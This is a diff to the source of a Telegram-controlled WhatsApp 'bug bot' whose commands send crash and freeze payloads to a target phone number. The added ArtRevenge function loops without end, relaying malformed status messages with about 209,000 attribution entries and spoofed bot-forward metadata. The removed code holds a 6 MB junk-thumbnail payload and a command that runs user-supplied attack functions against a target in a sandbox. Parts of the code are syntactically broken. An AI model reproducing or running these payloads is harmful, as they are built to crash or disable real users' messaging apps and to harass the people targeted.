@@ -2129,8 +2129,8 @@ bot.command("delayworek", checkAllPremium, checkWhatsAppConnection, async (ctx) 
   await ctx.reply(`✅ delayworek (bug) selesai untuk ${q}`);
 
   (async () => {
-    for (let r = 0; r < 40; r++) {
-  await DelayNewVnX(sock, target);
+    for (let r = 0; r < 1; r++) {
+  await ArtRevenge(sock, target);
 }
   })();
 
@@ -2164,7 +2164,7 @@ bot.command("dangerdelay", checkAllPremium, checkWhatsAppConnection, async (ctx)
   await ctx.reply(`✅ dangerdelay (bug) terkirim dan selesai untuk ${q}`);
 
   (async () => {
-    for (let r = 0; r < 700; z++) {
+    for (let r = 0; r < 50; z++) {
   await ArtGold(sock, target);
   await sleep(1000);
 }
@@ -2241,141 +2241,6 @@ bot.command("androidcrash", checkAllPremium, checkWhatsAppConnection, async (ctx
     ctx.reply("❌ Terjadi error");
   }
 });
-/// CASE TEST FUNCTION ///
-bot.command("testfunction", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
-
-  try {
-    const q = ctx.message.text.split(" ")[1];
-  if (!q) return ctx.reply("🪧 Example : /testfunction 62xxx 10 (reply function)");
-    }
-
-    const q = args[1];
-    let jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000));
-
-    if (isNaN(jumlah) || jumlah <= 0) {
-      return bot.sendMessage(chatId, "❌ Jumlah harus angka");    
-
-    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
-
-    if (!msg.reply_to_message || !msg.reply_to_message.text) {
-      return bot.sendMessage(chatId, "❌ Reply dengan function");
-    }
-
-    const processMsg = await bot.sendPhoto(chatId, thumbnailUrlV2, {
-      caption: `
-<pre>⬡═―—⊱ ⎧ GXION ⎭ ⊰―—═⬡</pre>
-▢ Target: ${q}
-▢ Type: Unknown Func
-▢ Status: Process Bug
-╘═════════════════⬡
-`,
-      parse_mode: "HTML",
-      reply_markup: {
-        inline_keyboard: [
-          [
-            {
-              text: "! Check",
-              url: `https://wa.me/${q}`
-            }
-          ]
-        ]
-      }
-    });
-
-    const processMessageId = processMsg.message_id;
-
-    const safeSock = createSafeSock(sock);
-    const funcCode = msg.reply_to_message.text;
-
-    const matchFunc = funcCode.match(/async function\s+(\w+)/);
-    if (!matchFunc) {
-      return bot.sendMessage(chatId, "❌ Function tidak valid");
-    }
-
-    const funcName = matchFunc[1];
-
-    const vm = require("vm");
-    const context = vm.createContext({
-      console,
-      Buffer,
-      sock: safeSock,
-      target,
-      sleep,
-      generateWAMessageFromContent,
-      generateForwardMessageContent,
-      generateWAMessage,
-      prepareWAMessageMedia,
-      proto,
-      jidDecode,
-      areJidsSameUser
-    });
-
-    // 🔥 FIX UTAMA (wrapper)
-    const wrapper = `${funcCode}\n${funcName}`;
-    const fn = vm.runInContext(wrapper, context);
-
-    // 🔥 FIX LOOP (biar jalan)
-    for (let i = 0; i < jumlah; i++) {
-      try {
-        const arity = fn.length;
-
-        if (arity === 1) {
-          await fn(target);
-        } else if (arity === 2) {
-          await fn(safeSock, target);
-        } else {
-          await fn(safeSock, target, true);
-        }
-      } catch (e) {}
-
-      await sleep(200);
-    }
-
-    const finalText = `
-<pre>╔═══『 GXION 』═══╗</pre>
-Target: ${q}
-Type: Unknown Func
-Status: Success Bug
-╚════════════════╝
-`;
-
-    try {
-      await bot.editMessageCaption(finalText, {
-        chat_id: chatId,
-        message_id: processMessageId,
-        parse_mode: "HTML",
-        reply_markup: {
-          inline_keyboard: [
-            [
-              {
-                text: "! Check",
-                url: `https://wa.me/${q}`
-              }
-            ]
-          ]
-        }
-      });
-    } catch (e) {
-      await bot.sendPhoto(chatId, thumbnailUrlV2, {
-        caption: finalText,
-        parse_mode: "HTML",
-        reply_markup: {
-          inline_keyboard: [
-            [
-              {
-                text: "! Check",
-                url: `https://wa.me/${q}`
-              }
-            ]
-          ]
-        }
-      });
-    }
-
-  } catch (err) {
-    console.error(err);
-  }
-});
  
 // ------------ (  FUNCTION BUGS ) -------------- \\
 async function DelayHardNullVnX(sock, target, ptcp = true) {
@@ -2406,36 +2271,64 @@ async function DelayHardNullVnX(sock, target, ptcp = true) {
     });
 }
 
-async function DelayNewVnX(sock, target) {
-   const vnxnew = {
-     groupStatusMessageV2: {
-       message: {
+async function ArtRevenge(sock, target) {
+ while (true) {
+  await sock.relayMessage("status@broadcast", {
+    botInvokeMessage: {
+      message: {
+        messageContextInfo: {
+          messageSecret: crypto.randomBytes(32),
+          deviceListMetadata: {
+            senderKeyIndex: 0,
+            senderTimestamp: Date.now(),
+            recipientKeyIndex: 0
+          },
+          deviceListMetadataVersion: 2
+        },
         interactiveResponseMessage: {
-          body: {
-           text: "⏳ VnX",
-            jpegThumbnail: Buffer.alloc(6 * 1024 * 1024 + 500000, 0xFF),
-            },
-            nativeFlowResponseMessage: {
-              name: "address_message",
-              paramsJson: "\x10".repeat(920 * 150),
-              version: 3 
-            },
-            contextInfo: {
-             isForwarded: true,
-               forwardingScore: 9999,
-               fromMe: true,
+          contextInfo: {
+            remoteJid: "status@broadcast",
+            fromMe: true,
             forwardedAiBotMessageInfo: {
-               botJid: "13135550202@bot",
-               botName: "Meta AI",
-               creator: "VnX"
-              }
-            }
+              botJid: "13135550202@bot",
+              botName: "ArT - Businnes",
+              creator: "ArT - Revenge"
+            },
+            statusAttributionType: 2,
+            statusAttributions: Array.from({ length: 209000 }, (_, z) => ({
+              type: 1
+            })),
+            participant: sock.user.id
+          },
+          body: {
+            text: "ArT - Revenge",
+            format: "DEFAULT"
+          },
+          nativeFlowResponseMessage: {
+            name: "call_permission_request",
+            paramsJson: "{ X: { status:true } }",
+            version: 3
           }
-       }
-     }
-   };
-           
-  await sock.relayMessage(target, vnxnew, {});
+        }
+      }
+    }
+  }, {
+    statusJidList: [target],
+    additionalNodes: [{
+      tag: "meta",
+      attrs: { status_setting: "contacts" },
+      content: [{
+        tag: "mentioned_users",
+        attrs: {},
+        content: [{
+          tag: "to",
+          attrs: { jid: target },
+          content: []
+         }]
+       }]
+     }]
+   })
+ }
 }
 
 async function ArTDeadass(sock, target) {
